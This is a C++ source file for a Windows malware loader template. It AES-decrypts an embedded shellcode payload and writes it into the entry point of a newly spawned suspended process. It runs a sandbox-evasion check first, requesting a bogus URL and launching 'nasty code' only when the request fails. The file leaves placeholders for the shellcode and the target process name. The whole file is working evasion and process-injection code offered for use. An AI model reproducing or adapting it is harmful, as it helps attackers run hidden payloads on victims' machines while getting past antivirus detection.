#include <windows.h>
#include <winternl.h>
#include <string>
#include <Wininet.h>


#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "ntdll")


using namespace std;


int AESDecrypt(char* payload, DWORD payload_len, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, &payload_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}

void addressOfEntryPointInjection(unsigned char* shellcode, int shellcode_len) {
	STARTUPINFOA si;
	si = {};
	PROCESS_INFORMATION pi = {};
	PROCESS_BASIC_INFORMATION pbi = {};
	DWORD returnLength = 0;

	// Insert Process name here
	
	
	
	
	AESDecrypt((char*)processName, sizeof(processName), key, sizeof(key));

	string sbinPath;
	for (int i=0; i < sizeof(processName)-1; i++)
		sbinPath = sbinPath + (char) processName[i];	
	
	LPSTR injectbinpath = _strdup(sbinPath.c_str());
	CreateProcessA(0, injectbinpath, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
	// get target image PEB address and pointer to image base
	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	DWORD pebOffset = (uintptr_t)pbi.PebBaseAddress + 8;
	// get target process image base address
	LPVOID imageBase = 0;
	ReadProcessMemory(pi.hProcess, (LPCVOID)pebOffset, &imageBase, 4, NULL);
	// read target process image headers
	BYTE headersBuffer[4096] = {};
	ReadProcessMemory(pi.hProcess, (LPCVOID)imageBase, headersBuffer, 4096, NULL);
	// get AddressOfEntryPoint
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
	LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (uintptr_t)imageBase);
	// write shellcode to image entry point and execute it
	WriteProcessMemory(pi.hProcess, codeEntry, shellcode, shellcode_len, NULL);
	ResumeThread(pi.hThread);
}


int main(int argc, char* argv[])
{
	/*
	if (strstr(argv[0], "test.exe") == 0)
	{
		printf("U are a RAT!");
		exit(1);
	}
	*/

	printf("Hello\n");
	
	// Insert Shellcode Here!




	char cononstart[] = "http://www.kdlsjfkdlsjfskdljfkdalsjflkds.com//"; //Invalid URL
	char readbuf[1024];
	HINTERNET httpopen, openurl;
	DWORD read;
	httpopen = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	openurl = InternetOpenUrl(httpopen, (LPCWSTR)cononstart, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, NULL);
	if (!openurl) // Access failed, we are not in AV
	{
		InternetCloseHandle(httpopen);
		InternetCloseHandle(openurl);
		printf("Starting nasty code!\n");
		AESDecrypt((char*)payload, sizeof(payload), key, sizeof(key));
		addressOfEntryPointInjection(payload, sizeof(payload));
		printf("Done!\n");
	}
	else // Access successful, we are in AV and redirected to a custom webpage
	{
		InternetCloseHandle(httpopen);
		InternetCloseHandle(openurl);
	}


	return 0;
}

